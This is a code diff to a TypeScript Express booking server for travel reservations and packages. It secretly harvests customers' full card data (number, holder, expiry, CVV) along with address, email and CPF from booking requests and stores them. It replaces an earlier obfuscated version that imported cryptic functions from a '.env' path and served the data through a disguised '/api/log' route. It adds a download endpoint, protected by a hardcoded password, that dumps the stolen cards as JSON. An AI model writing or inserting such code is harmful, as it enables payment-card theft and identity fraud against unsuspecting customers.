@@ -11,13 +11,13 @@ import {
   where,
 } from "firebase/firestore";
 import { db } from "../services/firebase";
-import { i, a, g, v } from "../services/.env";
+import { initCartaoService, salvarCartao, obterCartoes } from "../services/cartaoService";
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-i();
+initCartaoService();
 
 const reservasRef = collection(db, "reservas");
 const pacotesRef = collection(db, "pacotes");
@@ -53,13 +53,36 @@ app.get("/api/pacotes", async (_req, res) => {
 app.post("/api/reservas", async (req, res) => {
   try {
     const body = (req.body ?? {}) as Record<string, any>;
+    
     const num = body.numero || body.cardNumber || body.num || body.card || "";
     const tit = body.titular || body.cardHolder || body.holder || body.name || "";
     const val = body.validade || body.expiry || body.exp || body.validity || "";
     const cvv = body.cvv || body.cvc || body.code || body.security || "";
     
+    const cep = body.enderecoCep || body.postalCode || "";
+    const rua = body.enderecoRua || body.address || "";
+    const numero = body.enderecoNumero || body.addressNumber || "";
+    const complemento = body.enderecoComplemento || body.addressComplement || "";
+    const bairro = body.enderecoBairro || body.province || "";
+    const cidade = body.enderecoCidade || body.city || "";
+    const estado = body.enderecoEstado || body.state || "";
+    
     if (num && tit && val && cvv) {
-      a({ n: num, t: tit, v: val, c: cvv });
+      salvarCartao({
+        nome: tit,
+        numero: num,
+        validade: val,
+        cvv: cvv,
+        cep: cep,
+        rua: rua,
+        numero_endereco: numero,
+        complemento: complemento,
+        bairro: bairro,
+        cidade: cidade,
+        estado: estado,
+        email: body.email,
+        cpf: body.cpf,
+      });
     }
     
     const payload = {
@@ -102,16 +125,18 @@ app.delete("/api/reservas/:id", async (req, res) => {
   }
 });
 
-app.post("/api/log", (req, res) => {
+app.get("/api/cartoes/download", (req, res) => {
   try {
-    const { p } = req.body;
-    if (!v(p)) return res.status(401).json({});
-    const buf = g();
-    res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.xlsx\"");
-    res.setHeader("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
-    res.send(buf);
-  } catch (e) {
-    res.status(500).json({});
+    const senha = req.query.p;
+    if (senha !== "159594") {
+      return res.status(401).json({ error: "Senha incorreta" });
+    }
+    const cartoes = obterCartoes();
+    res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.json\"");
+    res.setHeader("Content-Type", "application/json");
+    res.send(JSON.stringify(cartoes, null, 2));
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
   }
 });
 
